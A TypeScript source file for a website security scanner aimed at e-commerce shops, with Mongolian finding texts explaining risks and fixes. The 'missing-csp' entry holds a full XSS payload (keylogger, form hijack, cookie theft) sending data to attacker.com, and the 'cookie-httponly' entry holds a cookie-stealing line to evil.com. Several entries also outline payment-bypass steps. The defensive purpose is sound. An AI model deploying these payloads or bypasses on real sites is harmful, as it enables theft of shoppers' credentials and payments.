import dns from "node:dns/promises";
import net from "node:net";
import tls from "node:tls";
import puppeteer from "puppeteer-core";

type Severity = "critical" | "high" | "medium" | "low" | "info" | "good";
export type ReportLanguage = "mn" | "en";

export interface Finding {
  id: string;
  title: string;
  severity: Severity;
  category: string;
  evidence: string;
  impact: string;
  recommendation: string;
}

export interface Metric {
  label: string;
  score: number;
  weight: number;
  summary: string;
}

export interface BrowserSignal {
  finalUrl: string;
  title: string | null;
  forms: number;
  passwordInputs: number;
  externalScripts: number;
  inlineScripts: number;
  mixedContent: string[];
  consoleErrors: string[];
  failedRequests: string[];
}

export interface TlsSignal {
  enabled: boolean;
  authorized: boolean | null;
  protocol: string | null;
  cipher: string | null;
  validFrom: string | null;
  validTo: string | null;
  issuer: string | null;
  subject: string | null;
}

export interface DnsSignal {
  mx: string[];
  spf: string | null;
  dmarc: string | null;
  caa: string[];
}

export interface PageSignal {
  url: string;
  status: number | null;
  title: string | null;
  kind: "home" | "product" | "cart" | "checkout" | "login" | "policy" | "other";
  https: boolean;
  forms: number;
  passwordInputs: number;
  paymentInputs: number;
  scripts: string[];
  providers: string[];
  riskyClientPaymentSignals: string[];
}

export interface EcommerceSignal {
  isLikelyEcommerce: boolean;
  platform: string[];
  paymentProviders: string[];
  qpayDetected: boolean;
  pagesChecked: PageSignal[];
  discoveredUrls: string[];
  policies: {
    privacy: boolean;
    terms: boolean;
    refund: boolean;
    contact: boolean;
  };
  cookieConsent: boolean;
  checkoutPages: number;
  cartPages: number;
  loginPages: number;
  suspiciousCheckoutScripts: string[];
  riskyClientPaymentSignals: string[];
  paymentBypassRiskScore: number;
  paymentBypassRiskLevel: "low" | "medium" | "high" | "critical";
  activePaymentBypassTested: false;
  activePaymentBypassNote: string;
}

export interface SecurityScanResult {
  inputUrl: string;
  finalUrl: string;
  scannedAt: string;
  status: number | null;
  responseTimeMs: number;
  contentType: string | null;
  headers: Record<string, string>;
  tls: TlsSignal;
  dns: DnsSignal;
  browser: BrowserSignal;
  ecommerce: EcommerceSignal;
  metrics: Metric[];
  findings: Finding[];
  score: number;
  grade: string;
  aiReview: string | null;
  aiModel: string | null;
  aiError: string | null;
}

const SECURITY_HEADERS = [
  "content-security-policy",
  "strict-transport-security",
  "x-frame-options",
  "x-content-type-options",
  "referrer-policy",
  "permissions-policy",
];

const KEY_PATHS = [
  "/cart",
  "/checkout",
  "/login",
  "/account",
  "/products",
  "/shop",
  "/privacy",
  "/privacy-policy",
  "/terms",
  "/terms-and-conditions",
  "/refund",
  "/refund-policy",
  "/contact",
];

const PROVIDERS: Record<string, RegExp> = {
  QPay: /\bqpay\b|qpay\.mn|qpaywallet|qpaymerchant|qpay_payment|deeplink/i,
  Stripe: /stripe\.com|stripe\.js|pk_live_|pk_test_|checkout\.stripe/i,
  PayPal: /paypal\.com|paypalobjects\.com|braintree/i,
  Shopify: /cdn\.shopify\.com|myshopify\.com|Shopify\.|\/cart\/add/i,
  WooCommerce: /woocommerce|wc-ajax|wp-content\/plugins\/woocommerce/i,
  "SocialPay": /socialpay/i,
  "Khan Bank": /khanbank|qpay|cardcenter/i,
  MonPay: /monpay/i,
  "2Checkout": /2checkout|verifone/i,
  Square: /squareup\.com|squarecdn/i,
};

const PLATFORM_HINTS: Record<string, RegExp> = {
  Shopify: /cdn\.shopify\.com|myshopify\.com|Shopify\.|\/cart\/add/i,
  WooCommerce: /woocommerce|wc-ajax|wp-content\/plugins\/woocommerce/i,
  Magento: /magento|mage\/|x-magento/i,
  BigCommerce: /bigcommerce|stencil-utils/i,
  Wix: /wixstatic\.com|wix\.com/i,
  Squarespace: /squarespace\.com|static1\.squarespace/i,
};

const GEMINI_MODEL = "gemini-2.5-flash";

const SEVERITY_ORDER: Severity[] = ["critical", "high", "medium", "low", "info", "good"];

const FINDING_TRANSLATIONS_MN: Record<
  string,
  { title?: string; evidence?: string; impact: string; recommendation: string }
> = {
  "no-https": {
    title: "HTTPS ашиглагдаагүй",
    evidence: "Хуудасны эцсийн URL нь HTTP байна.",
    impact: "Яаг юу болох вэ: Халдагч таны дэлгүүр рүү орж буй хэрэглэгчтэй нэг WiFi сүлжээнд (кафе, оффис, нийтийн газар) байж Wireshark гэх хэрэгслээр траффикийг нэрлэсэн текстэд бичнэ. Таны сайт HTTP тул бүх зүйл ил харагдана — нэр, нууц үг, хаяг, захиалгын дэлгэрэнгүй, QPay мэдээлэл. Хэрэглэгч захиалгаа хийснийг мэдэх боловч нэг минутын дотор мэдээлэл нь халдагчид очсон байна. Хэрэглэгч юу болсныг огт мэдэхгүй.",
    recommendation: "Сайтыг HTTPS-ээр ажиллуул, HTTP хүсэлтийг автоматаар HTTPS руу дамжуул.",
  },
  "tls-invalid": {
    title: "TLS сертификат итгэмжлэгдээгүй",
    evidence: "TLS handshake дууссан, гэхдээ сертификат зөвшөөрөгдөөгүй.",
    impact: "Яаг юу болох вэ: Хэрэглэгч таны сайтад орохоор оролдоход Chrome/Safari 'Энэ сайт аюулгүй биш' гэсэн том улаан анхааруулга харуулна. Ихэнх хэрэглэгч тэр дэлгэцийг харсны дараа яаран гарна — борлуулалт тасрана. Нэмж хэлэхэд халдагч 'man-in-the-middle' халдлагаар хэрэглэгч болон таны сервер хоёрын хооронд орж нэвтрэх мэдээллийг уншиж болно.",
    recommendation: "Энэ hostname-д зориулсан хүчинтэй сертификат суулга, бүрэн chain багтаа.",
  },
  "tls-old": {
    title: "Хуучин TLS протокол ашиглагдаж байна",
    impact: "Яаг юу болох вэ: TLS 1.0/1.1 нь BEAST, POODLE гэх мэт мэдэгдэж буй халдлагад өртөмхий. Дэвшилтэт мэдлэгтэй халдагч эдгээр хэрэгслийг ашиглан таны сервер болон хэрэглэгч хоёрын хооронд шифрлэгдсэн холболтыг задалж мэдээллийг уншиж болно. Аюулын зэрэг дундаас өндөр тул аль болох хурдан шинэчил.",
    recommendation: "TLS 1.0/1.1-ийг идэвхгүй болгож, TLS 1.2 эсвэл TLS 1.3 ашигла.",
  },
  "missing-hsts": {
    title: "HSTS header байхгүй",
    evidence: "Strict-Transport-Security header олдсонгүй.",
    impact: "Яаг юу болох вэ: Хэрэглэгч http://mongolz.shop гэж хаягийн мөрөнд бичвэл эхний хүсэлт HTTP-ээр явна. Нийтийн WiFi дэх халдагч тэр хүсэлтийг таслан, хуурамч HTTP хувилбар руу дамжуулна (SSL stripping). Хэрэглэгч хэвийн хуудас харж HTTPS болсон гэж бодон нэвтрэх мэдээллээ оруулна, гэхдээ бодит байдал дээр HTTP дээр явна тул халдагч бүх зүйлийг уншина.",
    recommendation: "HTTPS бүх газарт ажилж байгааг шалгасны дараа урт max-age-тай Strict-Transport-Security нэм.",
  },
  "missing-csp": {
    title: "Content Security Policy (CSP) байхгүй — XSS халдлага бүрэн нээлттэй",
    evidence: "Content-Security-Policy header олдсонгүй.",
    impact: `Яаг юу болох вэ — яг энэ script-ийг ашиглана:

АЛХАМ 1 — Халдагч таны хайлт эсвэл коммент хэсэгт дараах бичвэрийг хуулан буулгана (энэ нь бодит ашиглагддаг script):
<script>
(function(){
  // Keylogger: товч бүр дарахад явуулна
  document.addEventListener('keyup',function(e){
    new Image().src='https://attacker.com/k?key='+encodeURIComponent(e.key)+'&url='+encodeURIComponent(location.href);
  });
  // Form hijack: submit дарахад бүх талбарыг явуулна
  document.querySelectorAll('form').forEach(function(f){
    f.addEventListener('submit',function(){
      fetch('https://attacker.com/form',{method:'POST',body:new FormData(f)});
    },true);
  });
  // Cookie theft: нэн даруй cookie явуулна
  new Image().src='https://attacker.com/c?v='+encodeURIComponent(document.cookie);
})();
</script>

АЛХАМ 2 — Хэрэв хайлт/коммент хадгалагддаг бол (stored XSS): тэр хуудасыг нээдэг хэрэглэгч БҮР дээрх скриптийг ажиллуулна. 1 удаагийн халдлага → хэдэн мянган хэрэглэгчийн мэдээлэл.

АЛХАМ 3 — attacker.com-д хүсэлт ирнэ: ?key=С, ?key=э, ?key=р... гэж нэр, нууц үг, хаяг, QPay мэдээлэл товч бүр дарах бүрд очно. Form submit дарахад бүх талбар нэг дор POST-оор очно.

АЛХАМ 4 — Хэрэглэгч ямар ч анхааруулга харахгүй, таны сайт хэвийн харагдана, гэхдээ бүх мэдээлэл халдагчид очсон байна.

CSP байсан бол: connect-src 'self' гэж тохируулсан тул хөтөч attacker.com руу хүсэлт явуулахыг автоматаар блоклох байсан. Script ажиллах ч үгүй.`,
    recommendation: `Next.js дээр яг хэрхэн нэмэх вэ (next.config.ts):

async headers() {
  return [{
    source: '/(.*)',
    headers: [{
      key: 'Content-Security-Policy',
      value: [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "connect-src 'self' https://api.qpay.mn",
        "frame-ancestors 'none'",
        "form-action 'self'",
        "base-uri 'self'"
      ].join('; ')
    }]
  }]
}

Директив бүрийн утга: default-src 'self' = зөвхөн таны домэйнаас л ачаалж болно. connect-src 'self' https://api.qpay.mn = зөвхөн таны сервер болон QPay руу л хүсэлт явуулж болно — attacker.com БЛОКЛОГДОНО. frame-ancestors 'none' = таны сайтыг iframe-аар оруулахыг хориглоно. form-action 'self' = form-ийн submit зөвхөн таны домэйн руу явна.

Нэмж заавал хий: хайлт, коммент, URL параметрийн бүх оролтоос < > ' " & тэмдэгтийг HTML entity болгон encode хий — input sanitization. Шалгах: Chrome → F12 → Console дотор "Content Security Policy" гэсэн violation мэдэгдэл харагдвал тэр эх сурвалжийг connect-src эсвэл script-src-д нэм.`,
  },
  "weak-csp": {
    title: "CSP аюултай эх сурвалж зөвшөөрч байна",
    impact: "Яаг юу болох вэ: 'unsafe-inline' эсвэл wildcard (*) зөвшөөрсөн CSP нь бараг байхгүйтэй адил. Халдагч inline скриптийн аль нэгийг өөрчилж хортой кодыг оруулна. * CDN зөвшөөрөгдсөн бол тэр CDN-ий аль ч URL-аас хортой файл ачаалж болно.",
    recommendation: "Wildcard болон unsafe-inline-ийг хаана боломжтой арилга; шаардлагатай inline кодод nonce эсвэл hash ашигла.",
  },
  "clickjacking": {
    title: "Clickjacking хамгаалалт байхгүй",
    evidence: "X-Frame-Options header болон CSP frame-ancestors directive олдсонгүй.",
    impact: "Яаг юу болох вэ: Халдагч 'Монгол хэрэглэгч iPhone хожиж байна — нэрээ бичнэ үү' гэх мэт хуурамч сайт үүсгэж, таны checkout хуудасны iframe-ийг тунгалаг (opacity: 0) байдлаар дотор нь байрлуулна. Хэрэглэгч 'Шагнал авах' товч дарахад үнэн дээрээ таны 'Захиалга баталгаажуулах' товч дарж байна. Хэрэглэгч мэдэлгүйгээр захиалга үүсч мөнгө гардаг. Нэвтрэх хуудасны хувьд: мэдэлгүйгээр данс нэвтрэх мэдээлэл оруулна.",
    recommendation: "CSP frame-ancestors эсвэл X-Frame-Options: DENY/SAMEORIGIN тохируул.",
  },
  "no-nosniff": {
    title: "X-Content-Type-Options байхгүй",
    evidence: "X-Content-Type-Options: nosniff олдсонгүй.",
    impact: "Яаг юу болох вэ: Сайтад файл upload хийх боломж байвал халдагч зургийн файл (.jpg) мэт харагдах файлыг JavaScript код агуулсан байдлаар upload хийнэ. nosniff байхгүй тул хөтөч агуулгыг JavaScript гэж таамаглан гүйцэтгэнэ — хортой код ажиллана. Ихэвчлэн profile зураг, бараа зураг upload боломжтой дэлгүүрт ашигладаг халдлага.",
    recommendation: "X-Content-Type-Options: nosniff тохируул.",
  },
  "no-referrer-policy": {
    title: "Referrer Policy байхгүй",
    evidence: "Referrer-Policy header олдсонгүй.",
    impact: "Яаг юу болох вэ: Хэрэглэгч checkout дуусаад баярлалаа хуудас дээрх зарны баннер дарна гэж бодъё. Тэр зарны компани Referer header-т https://mongolz.shop/order/confirm?order_id=12345&amount=50000 гэсэн бүтэн URL хүлээн авна. Захиалгын ID, дүн бусдад задарна. Мөн аналитик компаниуд хэрэглэгчийн захиалгын түүхийг харж болно.",
    recommendation: "Referrer-Policy тохируул, ихэвчлэн strict-origin-when-cross-origin хэрэглэнэ.",
  },
  "no-permissions-policy": {
    title: "Браузерын зөвшөөрлийн бодлого байхгүй",
    evidence: "Permissions-Policy header олдсонгүй.",
    impact: "Яаг юу болох вэ: Хэрэв сайтад XSS алдаа эсвэл хортой гуравдагч скрипт байвал — Permissions-Policy байхгүй тул тэр скрипт хэрэглэгчийн камер, микрофон, байршлыг идэвхжүүлж болно. Checkout дэлгэц дээр хэрэглэгчийн нүүрийг нуувч зураглах, дуу бичих боломж онолын хувьд нээлттэй хэвээр байна. Аюулт тохиолдол ховор ч байж болзошгүй тул хаах нь зүйтэй.",
    recommendation: "Permissions-Policy тохируулж камер, микрофон, геолокаци болон ашиглагдаагүй функцүүдийг хаа.",
  },
  "cookie-secure": {
    title: "Cookie-д Secure тэмдэглэгээ байхгүй",
    evidence: "Нэг буюу хэд хэдэн Set-Cookie header-д Secure байхгүй.",
    impact: "Яаг юу болох вэ: Сайт HTTPS боловч нэг л HTTP endpoint байвал (зургийн URL, redirect гэх мэт) Secure тэмдэггүй сессийн cookie тэр хүсэлтэд дагалдана. Нийтийн WiFi дэх халдагч тэр cookie-г уншиж хэрэглэгчийн нэвтрэлтийн сессийг бүхэлд нь авна — нэр, хаяг, захиалгын түүх нээгдэнэ.",
    recommendation: "Authentication болон state cookie-д Secure тэмдэглэгээ нэм.",
  },
  "cookie-httponly": {
    title: "Cookie-д HttpOnly тэмдэглэгээ байхгүй",
    evidence: "Нэг буюу хэд хэдэн Set-Cookie header-д HttpOnly байхгүй.",
    impact: "Яаг юу болох вэ: Халдагч XSS халдлагаар (хайлт хэсэг, коммент, URL параметр) нэг мөр код оруулна: document.location='https://evil.com/?c='+document.cookie. Хэрэглэгч тэр хуудас нээхэд сессийн cookie автоматаар халдагчийн серверт явна. Халдагч тэр cookie ашиглан хэрэглэгчийн данстай адил эрхтэйгээр нэвтэрч захиалгийн түүх, хаяг, утасны дугаарыг харна. HttpOnly байсан бол JavaScript-аас cookie уншиж чадахгүй байсан.",
    recommendation: "Browser JavaScript хандалт шаардлагагүй cookie-д HttpOnly нэм.",
  },
  "cookie-samesite": {
    title: "Cookie-д SameSite тэмдэглэгээ байхгүй",
    evidence: "Нэг буюу хэд хэдэн Set-Cookie header-д SameSite байхгүй.",
    impact: "Яаг юу болох вэ: Халдагч өөр сайтаас (хуурамч имэйл дэх зураг, iframe) таны сайт руу нуугдмал хүсэлт илгээнэ — CSRF халдлага. SameSite байхгүй тул хэрэглэгчийн браузер cookie-г автоматаар дагалдуулна. Таны сайт тэр хүсэлтийг хэрэглэгч өөрөө хийсэн гэж ойлгоно — мэдэлгүйгээр захиалга хийгдэнэ, хаяг өөрчлөгдөнө, данс зарцуулагдана.",
    recommendation: "Cross-origin хандалт шаардлагагүй cookie-д SameSite=Strict эсвэл SameSite=Lax нэм.",
  },
  "x-powered-by": {
    title: "X-Powered-By header-аар технологи задарч байна",
    impact: "Яаг юу болох вэ: Халдагч X-Powered-By: Next.js 14.x гэсэн мэдээллийг харж '14.x next.js CVE' гэж интернэтэд хайна. Тэр хувилбарт мэдэгдсэн сул тал байвал Nuclei, Metasploit гэх автомат хэрэгслээр таны сайтыг скан хийнэ. Мэдэгдэх шаардлагагүй мэдээллийг задруулж байна — хасах нь бодитой аюулыг бага зэрэг бууруулна.",
    recommendation: "Сервер эсвэл framework тохиргоонд X-Powered-By header-ийг дарах эсвэл хас.",
  },
  "cert-expiry-soon": {
    impact: "Яаг юу болох вэ: Сертификат дуусмагц Chrome/Safari 'Энэ сайт аюулгүй биш — буцах' гэсэн том улаан хуудас харуулна. Хэрэглэгчдийн 95%+ тэр дэлгэцийг харсны дараа яаран гарна. Дэлгүүр хэдэн цагаас хэдэн өдрийг ч ажиллахгүй байж болно, борлуулалт бүхэлдээ зогсоно. Google хайлтад ч доошлуулна.",
    recommendation: "Сертификатыг дуусахаас өмнө шинэчил; Let's Encrypt-ийн автомат шинэчлэлтийг тохируулахыг зөвлөнө.",
  },
  "password-http": {
    title: "Нууц үгийн талбар аюулгүй бус хуудас дээр байна",
    impact: "Яаг юу болох вэ: Хэрэглэгч нэвтрэх хуудсанд нэр, нууц үгээ бичиж 'Нэвтрэх' дарна. Тэр мэдээлэл интернэтэд нэрлэсэн текст хэлбэрт явна — нийтийн WiFi дэх халдагч Wireshark-аар нэр, нууц үгийг 1 секундын дотор уншина. Хэрэглэгчид нийтлэг нууц үг дахин ашиглах тохиолдолд халдагч Gmail, Facebook гэх бусад дансанд ч нэвтэрч болно.",
    recommendation: "Нэвтрэх болон бүртгэлийн маягтыг яаралтай HTTPS руу шилжүүл.",
  },
  "mixed-content": {
    title: "HTTPS хуудас HTTP asset ачааллаж байна",
    impact: "Яаг юу болох вэ: HTTPS хуудас дотор HTTP-ээр ачаалагдах .js файл байвал халдагч тэр HTTP хүсэлтийг таслан хортой JavaScript-аар солино. Хэрэглэгч HTTPS дээр байна гэж бодсоор байхад checkout-ын keylogger ажиллаж байна. Хамгийн аюулт хэлбэр нь HTTP-ийн скрипт файлыг солих.",
    recommendation: "Бүх зураг, скрипт, стиль, фрэймийг HTTPS-ээр ачаал.",
  },
  "inline-script-surface": {
    title: "CSP байхгүйд inline скрипт их байна",
    impact: "Яаг юу болох вэ: Дурын XSS алдааны үед халдагч inline script оруулах боломжтой. CSP байхгүй, inline script хаа сайгүй тул хортой код хаана оруулсан ч хөтөч гүйцэтгэнэ — checkout-ийн бүх дата хулгайлах замд ашигладаг.",
    recommendation: "Inline скриптийг bundle asset руу шилжүүл, CSP nonce/hash стратеги ашигла.",
  },
  "runtime-errors": {
    title: "Браузерын ажиллах үеийн алдаа илэрсэн",
    impact: "Яаг юу болох вэ: Эвдэрсэн скрипт болон амжилтгүй resource нь хамгаалалтын контролуудыг (CSRF хамгаалалт, input шалгалт, session check) идэвхгүй болгож болно. Хэрэглэгчийн хувьд checkout, нэвтрэлт, захиалга дуусгах урсгал дундуур зогсч болно — борлуулалт алдагдана.",
    recommendation: "Хуудас ачаалах үед олдсон амжилтгүй браузерын хүсэлт болон JavaScript алдааг засна уу.",
  },
  "header-coverage": {
    title: "Хамгаалалтын header бүрхэлт",
    impact: "Дутуу байгаа header бүр нэг аюулгүй байдлын давхаргыг нэмэхгүй байгааг харуулна. Дангаараа critical биш, гэхдээ CSP, X-Frame-Options, nosniff зэрэг хавсарч байвал хэд хэдэн халдлагын зам нэгэн зэрэг нээлттэй гэсэн үг.",
    recommendation: "Хамгаалалтын header-ийг зориудаар тохируулж, deployment бүрийн дараа шалга.",
  },
  "ecom-insecure-sensitive-page": {
    title: "Checkout, cart эсвэл login хуудас HTTPS биш",
    impact: "Яаг юу болох вэ: Хэрэглэгч cart эсвэл checkout-д нэр, хаяг, утасны дугаар бичиж submit дарна. HTTP тул тэр хүсэлт нэрлэсэн текстэд явна. Сүлжээн дэх халдагч тэр мэдээллийг уншаад ч зогсохгүй хаягийг өөрийнх болгон өөрчилж болно — таны үйлчлүүлэгчийн захиалга халдагчийн хаягт очно.",
    recommendation: "Cart, checkout, login, account болон төлбөрийн бүх URL-д HTTPS-ийг албадан хэрэгжүүл.",
  },
  "checkout-not-found": {
    title: "Checkout хуудас олдсонгүй",
    impact: "Checkout нуугдсан, блоклогдсон, эсвэл зөвхөн cart үйлдлийн дараа л үүсдэг тул сканнер аюулгүй байдлыг баталгаажуулж чадахгүй. Нуугдсан checkout нь аюулгүй гэсэн үг биш — нэвтэрсэн хэрэглэгч бүр тэр хуудсаар дайрна, алдаа байвал мэдэх боломжгүй.",
    recommendation: "Мэдэгдэж буй checkout/cart замуудыг нийтэд нээлттэй болго эсвэл энэ сайтад authenticated/manual checkout тест ажиллуул.",
  },
  "payment-provider-not-found": {
    title: "Төлбөрийн систем танигдсангүй",
    evidence: "Stripe, PayPal, Shopify, WooCommerce, QPay, MonPay, SocialPay эсвэл ижил төстэй төлбөрийн дохио олдсонгүй.",
    impact: "Custom буюу танигдаагүй төлбөрийн систем ашиглаж байгаа бол сканнер баталгаажуулалт логикийг шалгаж чадахгүй. Custom систем бол голдуу серверийн баталгаажуулалт дутуу байдаг — гүнзгий manual шалгалт заавал хэрэгтэй.",
    recommendation: "Төлбөрийн системийг баримтжуулж, мэдрэмжтэй төлбөрийн боловсруулалтыг найдвартай PCI-нийцтэй үйлчилгээний хуудсанд байлга.",
  },
  "suspicious-payment-routes": {
    title: "Браузерт exploit-д бэлэн төлбөрийн зам илэрсэн — МАШ АЮУЛТАЙ",
    impact: "Яаг юу болох вэ: Хуудас ачаалах үед браузерын console эсвэл failed request-д /cart/free/buy, skip_payment=1, amount=0, эсвэл payment callback URL бүтэц харагдсан. Халдагч: 1) Тэр URL-ийг хаягийн мөрөнд шууд оруулах эсвэл параметрийг өөрчлөх. 2) Төлбөр огт хийхгүй захиалга илгээх. 3) Сервер төлбөрийн статусыг бие даан шалгахгүй бол захиалга 'дууссан' тэмдэглэгдэж бараа явуулна. Нэг удаа амжилтанд орвол Telegram/Discord бүлгүүдэд цагийн дотор тарана.",
    recommendation: "ЯАРАЛТАЙ засах: 1) /cart/free эсвэл skip_payment гэсэн аливаа замыг устга эсвэл authentication-ы ард хаа. 2) URL query параметрээс amount, paid, order_status утгыг ХЭЗЭЭ Ч бүү ав — серверт дахин тооцоол. 3) Захиалгыг 'дууссан' тэмдэглэхийн өмнө QPay/банкнаас серверт баталгаажуулалт авах. 4) Debug/test/admin payment замуудыг production-д устга. 5) Codebase-д эдгээр pattern хайж, order статуст хүрэх бүх код замыг audit хий.",
  },
  "qpay-detected": {
    title: "QPay дохио илэрсэн — серверт баталгаажуулалт заавал хэрэгтэй",
    evidence: "QPay мөр, холбоос эсвэл скрипт нийтийн хуудаснаас олдсон.",
    impact: "Яаг юу болох вэ: Хэрэв бэкэнд QPay invoice статусыг зөвхөн browser callback-аас авдаг бол — 1) Халдагч бараа сагсанд хийж checkout-д хүрнэ. 2) QPay QR гарна, гэхдээ халдагч төлбөр хийхгүй. 3) Browser DevTools → Network tab дээр webhook/callback URL-ийг тогтооно. 4) Тэр URL руу ?status=paid&invoice_id=хуурамч гэж хүсэлт явуулна. 5) Сервер QPay-аас шалгахгүй бол захиалгыг \"төлсөн\" гэж тэмдэглэж бараа явуулна. Нэг удаа амжилтанд орвол энэ мэдлэг чат, форумаар тараагдаж маш богино хугацаанд олон хүн ашиглана.",
    recommendation: "Засах дараалал: 1) QPay invoice үүсгэхдээ серверт тооцсон дүнг ашигла. 2) Callback/webhook ирэхэд QPay REST API-аас invoice_id болон статусыг шалга — PAID эсэх, дүн тохирч байгаа эсэхийг. 3) Browser-аас ирсэн \"paid=true\", \"status=success\", \"invoice_id=...\" утгыг ХЭЗЭЭ Ч бие даан бүү ашигла. 4) Authorized QPay sandbox тест хий: төлбөр хийхгүйгээр callback URL руу хуурамч хүсэлт явуулж, систем зөв татгалзаж байгааг баталга.",
  },
  "client-payment-tamper-risk": {
    title: "Клиент талын төлбөр өөрчлөх эрсдэл илэрсэн — яаралтай засна уу",
    impact: "Яаг юу болох вэ: 1) Халдагч таны checkout хуудас дээр F12 → Elements tab нээнэ. 2) amount=50000 гэсэн hidden input-ийн утгыг amount=1 болгоод хадгална. 3) 1₮ QPay төлбөр хийж callback явуулна. 4) Сервер клиентийн дүнг ашиглавал 50,000₮-ийн захиалгыг 1₮-ийн үнээр баталгаажуулна — бараа явуулна. Coupon/discount логик байвал discount=100 гэж оруулж бүтэн захиалгыг үнэгүй болгоно. Нэг удаа амжилтанд орвол Telegram, чат-аар тараагдаж цөөхөн хугацаанд олон хүн ашиглана.",
    recommendation: "ЯАРАЛТАЙ засах: 1) Checkout дүнг ЗӨВХӨН серверт тооцоол — cart item × qty, хөнгөлөлт, татвар бүгдийг серверт хий. 2) QPay invoice-ийг серверийн тооцсон дүнгээр үүсгэ, клиентийн дүнг бүү ашигла. 3) Callback ирэхэд QPay API-аас invoice_id болон amount-ийг тулга. 4) Клиентийн илгээсэн amount, total, paid, discount, order_status утгыг бизнес логикт хэзээ ч бүү ашигла. 5) Test: DevTools-аар amount өөрчил, захиалга явуул, сервер татгалзаж байгааг баталга.",
  },
  "payment-bypass-surface": {
    title: "Нийтийн төлбөрийн bypass дохио олдсонгүй",
    impact: "Нийтийн скан дээр илт дохио олдсонгүй — энэ сайн тал. Гэхдээ checkout логик нь зөвхөн authenticated flow-д л харагдана тул бүрэн баталгаажуулж чадахгүй. Аюулгүй гэсэн баталгаа биш — authorized тест хийж баталгаажуулах шаардлагатай.",
    recommendation: "Authorized checkout тест хий: 1) Staging орчинд cart-д бараа хийж checkout-д хүрч, DevTools-аар amount/total field-ийн утгыг өөрчил. 2) QPay sandbox invoice үүсгэж, серверийн тооцсон дүнтэй тохирч байгааг шалга. 3) Webhook/callback дуусгахгүйгээр хуурамч \"paid\" хүсэлт явуулж, сервер татгалзаж байгааг баталга. 4) Server log-д клиентийн дүн vs серверийн тооцсон дүн тулгагдаж байгааг шалга.",
  },
  "checkout-third-party-scripts": {
    title: "Checkout дээр ер бусын гуравдагч скрипт байна",
    impact: "Яаг юу болох вэ: Checkout дэлгэц дээрх гуравдагч скриптийн эзэн хакдагдвал эсвэл хортой байвал тэр скриптийг шинэчлэж keylogger нэмнэ. Тэр код таны бүх checkout дэлгэц дээр хэрэглэгч бичиж буй нэр, хаяг, QPay PIN-ийг алсын серверт явуулна. Таны сайтын код цэвэр байсан ч гуравдагч скриптийн эзний сервер эвдэрвэл ийм зүйл боломжтой.",
    recommendation: "Checkout дээр зөвхөн шаардлагатай analytics/төлбөрийн скриптийг зөвшөөр, хатуу checkout CSP хэрэгжүүл.",
  },
  "privacy-policy-missing": {
    title: "Нууцлалын бодлого олдсонгүй",
    evidence: "Нийтийн нууцлалын бодлогын зам/холбоос илэрсэнгүй.",
    impact: "Хэрэглэгч хувийн мэдээлэл, хаяг, утасны дугаар, захиалгын мэдээлэл хаашаа явж байгааг мэдэхгүй. Хэрэглэгчийн итгэл буурна, маргаан гарахад таны эрх зүйн байр суурь сулрана.",
    recommendation: "Footer, checkout болон бүртгэлийн хуудсанд холбогдсон тодорхой нууцлалын бодлого нэм.",
  },
  "refund-policy-missing": {
    title: "Буцаалтын бодлого олдсонгүй",
    evidence: "Нийтийн буцаалт/буцааж өгөх/цуцлах бодлогын зам/холбоос илэрсэнгүй.",
    impact: "Буцаалтын нөхцөл тодорхойгүй бол хэрэглэгч банктаа 'зөвшөөрөлгүй гүйлгээ' гэж маргаан гаргана. Банкны chargeback процесс таны хийж буй тодорхой борлуулалтаас хэд дахин үнэтэй байна.",
    recommendation: "Checkout болон footer-д буцаалт, буцааж өгөх, цуцлах, хүргэлтийн нөхцөлийг нэм.",
  },
  "cookie-consent-not-detected": {
    title: "Cookie зөвшөөрөл олдсонгүй",
    evidence: "Нийтийн HTML-д cookie/зөвшөөрөл/tracking дохио олдсонгүй.",
    impact: "Analytics, зар, chat, retargeting скрипт ажиллаж байгаа бол хэрэглэгчид мэдэгдэхгүй мэдээлэл цуглуулна. Нийтийн итгэл буурна, зарим зах зээлд хуулийн хариуцлага үүснэ.",
    recommendation: "Дэлгүүр борлуулж буй зах зээлд тохирсон cookie зөвшөөрлийн механизм нэм.",
  },
  "mx-missing": {
    title: "MX бичлэг олдсонгүй",
    evidence: "Root домэйнд MX бичлэг байхгүй.",
    impact: "Яаг юу болох вэ: Хэрэглэгч захиалга хийсний дараа баталгаажуулах имэйл хүлээнэ — очихгүй. 'Захиалга хийгдсэн үү? Мөнгөө аваачсан уу?' гэж дахин захиалга хийнэ, дахин дахин залгана. Нууц үг мартсан хэрэглэгч сэргээж чадахгүй — данс орхино. Customer support ачаалал ихэсч цагаараа шийдэж чадахгүй болно.",
    recommendation: "Найдвартай шуудан хостинг тохируулж, захиалга/дэмжлэгийн имэйл хүргэлтийг тест хий.",
  },
  "spf-missing": {
    title: "SPF бичлэг олдсонгүй",
    evidence: "v=spf1 TXT бичлэг олдсонгүй.",
    impact: "Яаг юу болох вэ: Халдагч Python-ийн smtplib ашиглан From: info@mongolz.shop хаягаас имэйл илгээнэ. SPF байхгүй тул хүлээн авах серверүүд татгалзахгүй, spam хавтас руу ч ордоггүй. Хэрэглэгч 'Таны захиалга баталгаажлаа, хаягаа нягтлана уу' гэсэн имэйл авч, холбоос дарахад хуурамч хуудас нээгдэж нэр/хаяг/төлбөрийн мэдээлэл оруулна. Мөн өрсөлдөгч таны нэрийн өмнөөс spam явуулж нэр хүнд унагааж болно.",
    recommendation: "Энэ домэйнд шуудан илгээдэг бүх үйлчилгээнд SPF нэм.",
  },
  "dmarc-missing": {
    title: "DMARC бичлэг олдсонгүй",
    evidence: "_dmarc TXT бичлэг олдсонгүй.",
    impact: "Яаг юу болох вэ: Халдагч таны нэрийн өмнөөс олон мянган хэрэглэгчид 'Mongolz.shop-ийн онцгой урамшуулал — 24 цагт дусна, холбоосоор ор' гэсэн фишинг имэйл массаар явуулна. DMARC байхгүй тул Gmail, Outlook ч таних боломжгүй. Нэг амжилттай фишинг кампани таны брэндийн итгэлийг нурааж, хэрэглэгчдийн мэдээллийг хулгайлж болно.",
    recommendation: "DMARC нэм, эхлэлд мониторингоор эхэл, дараа quarantine эсвэл reject руу шилж.",
  },
  "dmarc-not-enforced": {
    title: "DMARC зөвхөн мониторинг горимд байна (p=none)",
    impact: "Яаг юу болох вэ: DMARC байгаа ч p=none тул хуурамч имэйл илгээхэд хүлээн авах серверүүд татгалзахгүй — зөвхөн тайлагнана. Халдагч таны нэрийн өмнөөс имэйл явуулсаар байна. p=reject болгоход л бодитой хамгаалалт болно.",
    recommendation: "DMARC aggregate тайланг 2–4 долоо хоног шалгасны дараа p=quarantine, дараа нь p=reject руу шилж.",
  },
  "spf-allow-all": {
